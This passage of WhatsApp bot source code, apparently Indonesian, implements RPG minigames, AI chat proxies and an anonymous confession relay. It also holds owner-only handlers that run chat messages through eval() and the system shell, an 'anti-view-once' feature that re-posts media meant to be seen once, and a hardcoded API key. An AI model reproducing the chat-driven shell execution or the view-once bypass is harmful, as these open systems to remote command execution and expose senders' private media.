m.reply(`🛍️ MARKET\n ┊ Seller : ${pushname}\n ┊ Buyer : Admin\n ┊ Harga/Emas : 25\n ┊ Status : Sukses\n ┊ Sisa Emas : ${getEmas(m.sender)}\n ┊ Sales Results : Rp ${rp}`)
}
break 
case 'jelajah': {
var tempsa = args.join(" ")
if (tempsa == 'corbiens river') {
var asu = `https://telegra.ph/file/00018dab77a6cea81523e.jpg`
setTimeout( async () => {
const vio = Math.ceil(Math.random() * 70) 
const pikan = Math.ceil(Math.random() * 15)
addStone(m.sender, vio)
addIkan(m.sender, pikan)
juna.sendMessage(m.chat, {image:{url: asu}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${vio}* batu dan *${pikan}* ikan${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
}, 2000); //2 minute
setTimeout( () => {
m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) 

} else if (tempsa === 'chiltawa woods') {
let gos = `https://telegra.ph/file/77c3badc9f97d6589a30f.jpg`
setTimeout( async () => {
const tesaaq = Math.ceil(Math.random() * 110) // batu
const ise = Math.ceil(Math.random() * 20)
addStone(m.sender, tesaaq)
addKayu(m.sender, ise)
juna.sendMessage(m.chat, {image:{url:gos},caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${tesaaq}* batu dan *${ise}* kayu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
}, 2000); //2 minute
setTimeout( () => {
m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'cochher sea') { 
let seae = `https://telegra.ph/file/eabfc907cfc447386b0c0.jpg`
setTimeout( async () => {
const feds = Math.ceil(Math.random() * 65)
addIkan(m.sender, feds)
juna.sendMessage(m.chat, {image:{url: seae},caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${feds}* ikan${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
}, 2000); //2 minute
setTimeout( () => {
m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'limingstall mountains') {
let seoe = `https://telegra.ph/file/19a10ff95c31af10267e4.jpg`
setTimeout(() => {
const fads = Math.ceil(Math.random() * 50)
const fids = Math.ceil(Math.random() * 80)
addOre(m.sender, fads)
addStone(m.sender, fids)
juna.sendMessage(m.chat, {image:{url:seoe}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${fads}* copper ore dan ${fids} batu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
}, 2000); //2 minute
setTimeout( () => {
m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'chade mountain') {
let seye = `https://telegra.ph/file/efdcd7d07dd22294695a8.jpg`
setTimeout( () => {
const pore = Math.ceil(Math.random() * 40)
const pone = Math.ceil(Math.random() * 60)
addOre(m.sender, pore)
addStone(m.sender, pone)
juna.sendMessage(m.chat, {image:{url:seye}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${pore}* copper ore dan ${pone} batu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
}, 3000); //2 minute
setTimeout( () => {
m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'gerbil woods') {
let siae = `https://telegra.ph/file/44fc684be9865c0fcb5fa.jpg`
setTimeout( async () => {
const tzys = Math.ceil(Math.random() * 90) // batu
const isue = Math.ceil(Math.random() * 45)
addStone(m.sender, tzys)
addKayu(m.sender, isue)
juna.sendMessage(m.chat, {image:{url:siae}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${tzys}* batu dan *${isue}* kayu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
}, 2000); //2 minute
setTimeout( () => {
m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'moobiens grassland') {
let bbbb = `https://telegra.ph/file/0c3fa86f57a4f6d9c4c0e.jpg`
setTimeout( () => {
const awqu = Math.ceil(Math.random() * 200) // batu
const usui = Math.ceil(Math.random() * 20)
addStone(m.sender, awqu)
addKayu(m.sender, usui)
juna.sendMessage(m.chat, {image:{url:bbbb}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${awqu}* batu dan ${usui} kayu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`} ,{quoted:m})
}, 2000); //2 minute
setTimeout( () => {
m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec
} else {
let seae = await getBuffer(`https://telegra.ph/file/16857796fab2ccb6cffc2.jpg`)
tesk = `*PILIH WILAYAH YANG INGIN KAMU JELAJAHI*


⚪ Corbiens River
🔵 Cochher Sea
⚫ Moobiens Grassland
🟣 Gerbil Woods
🟢 Chiltawa Woods
🟠 Limingstall Mountains
🔴 Chade Mountain

Contoh :
- ${prefix}jelajah corbiens river
`
juna.sendMessage(m.chat, { image: seae, caption: tesk}, {quoted: m}) 
}
}
break
case 'mancing':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
setTimeout( () => {
const fishing = Math.ceil(Math.random() * 10)
addIkan(m.sender, fishing)
m.reply(`*Congratulation 🎊*\n\n kamu mendapatkan *${fishing}* Ikan selama 2 menit`)
}, 6000); //2 minute
setTimeout( () => {
m.reply('Berhasil Mendapatkan Ikan . . .' )
}, 4000) // 1000 = 1s,
setTimeout( () => {
m.reply('🎣 Menarik Kail. . .' )
}, 3000) // 1000 = 1s,
setTimeout( () => {
m.reply('🎣 Mulai Memancing . . .')
}, 0) // 1000 = 1s,
}
break
case 'jualikan':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return m.reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaIkan = 10000
const hasil1 = bayar * hargaIkan
if ( getMancingIkan(m.sender) <= 1 ) return m.reply(`Maaf ${pushname} ikan kamu belum cukup, minimal 2 ikan`)
if ( getMancingIkan(m.sender) >= 1 ) {
jualIkan(m.sender, bayar)
addBalance(m.sender, parseInt(hasil1), balance)
await m.reply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah ikan dijual:* ${bayar}${enter}*Uang didapat:* ${hasil1}${enter}${enter}*Sisa ikan:* ${getMancingIkan(m.sender)}${enter}*Sisa uang:* Rp${getBalance(m.sender, balance)}`)
}
}
break

case 'jualcoal':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return m.reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaCoal = 15000
const hasil2 = bayar * hargaCoal
if ( getMiningcoal(m.sender) <= 1 ) return m.reply(`Maaf ${pushname} kamu tidak punya coal`)
if ( getMiningcoal(m.sender) >= 1 ) {
jualcoal(m.sender, bayar)
addBalance(m.sender, parseInt(hasil2), balance)
await m.reply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Coal dijual:* ${bayar}${enter}*Uang didapat:* ${hasil2}${enter}${enter}*Sisa coal:* ${getMiningcoal(m.sender)}${enter}*Sisa uang:* Rp${getBalance(m.sender, balance)}`)
}
}
break
case 'lebur':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return m.reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaOre = 2
const hasil3 = bayar * hargaOre
if ( getMiningore(m.sender) <= 1 ) return m.reply(`Maaf ${pushname} ore kamu belum cukup, minimal 2 ore`)
if ( getMiningore(m.sender) >= 1 ) {
jualore(m.sender, bayar)
addIngot(m.sender, hasil3)
await m.reply(`*「 LEBUR BERHASIL 」*\n\n*Jumlah Ore dilebur :* ${bayar}\n*Ingot didapat:* ${hasil3}\n\n*Sisa Ore:* ${getMiningore(m.sender)}`)
}
}
break
case 'jualstone':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return m.reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaStone = 900
const hasil4 = bayar * hargaStone
if ( getMiningstone(m.sender) <= 1 ) return m.reply(`Maaf ${pushname} stone kamu belum cukup, minimal 2 stone`)
if ( getMiningstone(m.sender) >= 1 ) {
jualstone(m.sender, bayar)
addBalance(m.sender, parseInt(hasil4), balance)
await m.reply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Batu dijual:* ${bayar}${enter}*Uang didapat:* ${hasil4}${enter}${enter}*Sisa Batu:* ${getMiningstone(m.sender)}${enter}*Sisa uang:* Rp${getBalance(m.sender, balance)}`)
}
}
break
case 'jualingot':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return m.reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaIngot = 35000
const hasil5 = bayar * hargaIngot
if ( getMiningingot(m.sender) <= 1 ) return m.reply(`Maaf ${pushname} ingot kamu belum cukup, minimal 2 ingot`)
if ( getMiningingot(m.sender) >= 1 ) {
jualingot(m.sender, bayar)
addBalance(m.sender, parseInt(hasil5), balance)
await m.reply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Ingot dijual:* ${bayar}${enter}*Uang didapat:* ${hasil5}${enter}${enter}*Sisa Ingot:* ${getMiningingot(m.sender)}${enter}*Sisa uang:* Rp${getBalance(m.sender, balance)}`)
}
}
break
case 'jualkayu':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return m.reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaKayu = 18000
const hasil6 = bayar * hargaKayu
if ( getNebangKayu(m.sender) <= 1 ) return m.reply(`Maaf ${pushname} kayu kamu belum cukup, minimal 2 kayu`)
if ( getNebangKayu(m.sender) >= 1 ) {
jualkayu(m.sender, bayar)
addBalance(m.sender, parseInt(hasil6), balance)
await m.reply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Kayu dijual:* ${bayar}${enter}*Uang didapat:* ${hasil6}${enter}${enter}*Sisa Kayu :* ${await getNebangKayu(m.sender)}${enter}*Sisa uang:* ${await getBalance(m.sender, balance)}`)
}
}
break
case 'nebang':{
setTimeout( () => {
const oreo = Math.ceil(Math.random() * 20)
addKayu(m.sender, oreo)
m.reply(`*Congratulation 🎊*${enter}${enter}kamu mendapatkan *${oreo}*kayu selama 2 menit`)
}, 2000); //2 minute
setTimeout( () => {
m.reply('Sedang menebang, silahkan tunggu...')
}, 0) //1sec
}
break
case 'goplanet':{
setTimeout( () => {
const bertualang = Math.ceil(Math.random() * 100)
const goplanet =['merkurius','venus','mars','jupiter','saturnus','neptunus','uranus']
const planetari = goplanet[Math.floor(Math.random() * goplanet.length)]
addPlanet(m.sender, bertualang)
m.reply(`*Congratulation 🎊*${enter}${enter}kamu mendapatkan *${bertualang} bahan kimia dari ${planetari}* selama 2 tahun`)
}, 2000); //2 minute
setTimeout( () => {
m.reply('Sedang meroket 😱, silahkan tunggu... 2 tahun')
}, 0) //1sec
}
break
case 'jualbahankimia':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return m.reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
buayar= args.join(" ")
const hargakimia = 1000
const dapetin = buayar * hargakimia
if ( getBertualangPlanet(m.sender) <= 1 ) return m.reply(`maaf ${pushname} kamu tidak punya bahankimia`)
if ( getBertualangPlanet(m.sender) >= 1 ) {
jualbahankimia(m.sender, buayar)
addBalance(m.sender, parseInt(dapetin), balance)
await m.reply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah bahankimia dijual:* ${buayar}${enter}*Uang didapat:* ${dapetin}${enter}${enter}*Sisa bahankimia:* ${getBertualangPlanet(m.sender)}${enter}*Sisa uang:* Rp${getBalance(m.sender, balance)}${enter}${enter}`)
}
}
break
case 'ai3':{
try {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return botjawab()
let result = await fetchJson(`https://aemt.me/gpt4?text=${text}`)
const gpt = result.result
m.reply(`${gpt}`)
} catch (err) {
console.log(err)
m.reply('Terjadi Kesalahan')
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case "aidraw": case "aidrawing": case "image": case "img": case 'chatgptimg': case 'openaiimg': case 'aiimg':{
if (!isCreator&&!isPremium) return m.reply(mess.OnlyPrem)
if (!text) throw 'Masukan Gambarannya\nContoh:\n1girl, with glasses, in beach'
m.reply(`Proses Ayang`)
try {
let txt = await getBuffer(`https://aemt.me/ai/text2img?text=${text}`)
await juna.sendMessage(m.chat, {image: txt, caption: `Done Sayang`},{quoted: m})
     } catch (e) {
m.reply('Gagal Convert Gambar') 
}
}
break
case 'bot': case 'vreden': case 'ai': case 'chatgpt':
try {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return botjawab()
let result = await fetchJson(`https://aemt.me/openai?text=${text}`)
const gpt = result.result
m.reply(`_${gpt}_`)
} catch (err) {
console.log(err)
m.reply('Terjadi Kesalahan')
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'simi': case 'simisimi': case 'sim': case 'gpt':
try {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return botjawab()
let result = await fetchJson(`https://api.lolhuman.xyz/api/simi?apikey=GataDios&text=${text}&badword=false`)
const gpt = result.result
m.reply(`${gpt}`)
} catch (err) {
console.log(err)
m.reply('Terjadi Kesalahan')
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'ai2': case 'chatgpt2':
try {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Contoh:\n${prefix}${command} Apa itu chatgpt`)
let result = await fetchJson(`https://aemt.me/gpt4?text=${text}`)
const gpt = result.result
m.reply(`${gpt}`)
} catch (err) {
console.log(err)
m.reply('Terjadi Kesalahan')
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case "confess": case 'menfes': case 'menfess':{
if (!isCreator&&!isPremium) return m.reply(mess.OnlyPrem)
this.menfes = this.menfes ? this.menfes : {}
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (roof) return m.reply("Kamu masih berada dalam sesi menfess")
if (m.isGroup) return m.reply('Fitur Khusus Di private chat!')
if (!text) return m.reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if (!text.includes('|')) return m.reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|6292818802718|Menfes nih\n`)
let [namaNya, nomorNya, pesanNya] = text.split`|`
if (nomorNya.startsWith('0')) return m.reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if(isNaN(nomorNya)) return m.reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
var yoi = `Hi ada menfess nih buat kamu\n\nDari : ${namaNya}\nPesan : ${pesanNya}\n\nSilahkan ketik ${prefix}balasmenfess -- Untuk menerima menfess/confess\nSilahkan ketik ${prefix}tolakmenfess -- Untuk menolak menfess/confess\n\n_Pesan ini di tulis oleh seseorang pengguna bot, bot hanya menyampaikan saja_`
let tod = await getBuffer('https://telegra.ph/file/c8fdfc8426f5f60b48cca.jpg') 
let id = m.sender
this.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
 await juna.sendMessage(nomorNya + '@s.whatsapp.net', {image: tod, caption:yoi }, {})
m.reply('Pesan berhasil dikirim ke nomor tujuan. Moga aja dibales coy')
}
break
case 'balasmenfess': case 'balasmenfes': {
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return m.reply("Belum ada sesi menfess")
find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find.b = m.sender
find.state = 'CHATTING'
this.menfes[find.id] = {...find}
await juna.sendMessage(other, {text: `_@${m.sender.split("@")[0]} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`, mentions: [m.sender]})
juna.sendMessage(m.chat, {text: `_Menfess telah diterima, sekarang kamu bisa chatan lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`})
}
break
 case 'tolakmenfess': case 'tolakmenfes': {
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return m.reply("Belum ada sesi menfess")
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
juna.sendMessage(other, {text: `_Uppsss... @${m.sender.split("@")[0]} Menolak menfess kamu_`, mentions: [m.sender]})
// await juna.sendMessage(find.a, {text: `_Uppsss... @${find.b.split("@")[0]} Menolak menfess kamu_`,mentions: [find.b]})
m.reply("Menfess berhasil di tolak 🤚")
delete this.menfes[roof.id]
}
break
 case "stopconfess": case 'stopmenfess': {
 //find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!find) return m.reply("Belum ada sesi menfess")
const to = find.a == m.sender ? find.b : find.a
juna.sendMessage(to, {text: `_Teman chat telah menghentikan menfess ini_`, mentions:[m.sender]})
await m.reply("ok")
delete this.menfes[find.id]
}
 break
default:
if ((budy) && ["Assalamualaikum", "assalamualaikum","Assalamu'alaikum",].includes(budy) && !isCmd) {
goblok = fs.readFileSync('./media/sound/salam.mp3')
juna.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
if ((budy) && ["Anjay", "anjay",].includes(budy) && !isCmd) {
goblok = fs.readFileSync('./media/sound/anjay.mp3')
juna.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
if ((budy) && ["Ajojing"," ajojing",].includes(budy) && !isCmd) {
goblok = fs.readFileSync('./media/sound/ajojing.mp3')
juna.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
//auto verivikasi kode
let mycode = await getCode(m.sender, daftar)
if ((budy) && [`${mycode}`,].includes(budy)) {
var angka = await randomNomor(10000, 99999)
addCode(m.sender, angka, daftar)
m.reply(`Terima kasih. Kode OTP sudah berhasil diverifikasi.\n\n*+ Rp 1000 Balance*`)
pendaftar.push(m.sender)
fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
addBalance(m.sender, 1000, balance)
}
if ((budy) && ["Bot", "bot",].includes(budy) && !isCmd) {
list = ['./media/sound/oy.mp3','./media/sound/kenapa.mp3','./media/sound/iya.mp3']
random = list[Math.floor(Math.random() * list.length)]
goblok = fs.readFileSync(random)
juna.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
if ((budy) && ["Thx", "Tq", "Terimakasih", "Terima kasih" ,"Makasih",].includes(budy) && !isCmd) {
m.reply(`Sama-sama kak ${pushname}`)
}
if ((budy) && ["Asu","Anj","Babi","Kntl","Jancok","Bajingan","Memek","Pantek",].includes(budy) && !isCmd) {
goblok = fs.readFileSync('./media/sound/toxic.mp3')
juna.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}


if ((budy) && ["proses", "Proses",].includes(budy) && !isCmd) {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!m.quoted) return m.reply('Reply pesanan yang akan proses')
let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
let proses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM : @jam\n✨ STATUS : Pending\`\`\`\n\n📝 Catatan :\n@pesanan\n\nPesanan @user sedang di proses!`
const getTextP = getTextSetProses(m.chat, set_proses);
if (getTextP !== undefined) {
var anunya = (getTextP.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
juna.sendTextWithMentions(m.chat, anunya, m)
} else {
juna.sendTextWithMentions(m.chat, (proses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)}
}

if ((budy) && ['done', "Done"].includes(budy) && !isCmd) {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!m.quoted) return m.reply('Reply pesanan yang telah di proses')
let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
let sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM : @jam\n✨ STATUS : Berhasil\`\`\`\n\nTerimakasih @user Next Order ya🙏`
const getTextD = getTextSetDone(m.chat, set_done);
if (getTextD !== undefined) {
var anunya = (getTextD.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
juna.sendTextWithMentions(m.chat, anunya, m)
} else {
juna.sendTextWithMentions(m.chat, (sukses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)}
}

if (budy.startsWith('=> ')) {
if (!isCreator) return m.reply(mess.OnlyOwner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(util.format(e))
}
}

if (budy.startsWith('> ')) {
if (!isCreator) return m.reply(mess.OnlyOwner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(util.format(err))
}
}

if (budy.startsWith('$ ')) {
if (!isCreator) return m.reply(mess.OnlyOwner)
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
if (m.mtype == 'viewOnceMessageV2') {
if (!setting.antiViewOnce) return
let msg = m.message.viewOnceMessageV2.message
 console.log(msg)
let type = Object.keys(msg)[0]
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
 for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
 }
let teks = `「 *ANTI VIEWONCE MESSAGE* 」

📛 *Name* : ${m.pushName}
👤 *User* : @${m.sender.split("@")[0]}
⏰ *Clock* : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB
✍️ *MessageType* : ${m.mtype}
💬 *Caption* : ${m.msg.caption ? m.msg.caption : "no caption"}`

await juna.sendTextWithMentions(m.chat, teks, m)
await delay(500)
if (/video/.test(type)) {
return juna.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
}
else if (/image/.test(type)) {
return juna.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
}
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
this.menfes = this.menfes ? this.menfes : {}
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
let other = find.a == m.sender ? find.b : find.a
await m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
participant: other
}
} : {})
}
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
return !0
}

}


} catch (err) {
//console.log(err)
//m.reply('Fitur Tersebut Tidak Ada!')
m.reply(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
// Credit By ZeeoneOfc
// Recode By JunaaSelebew
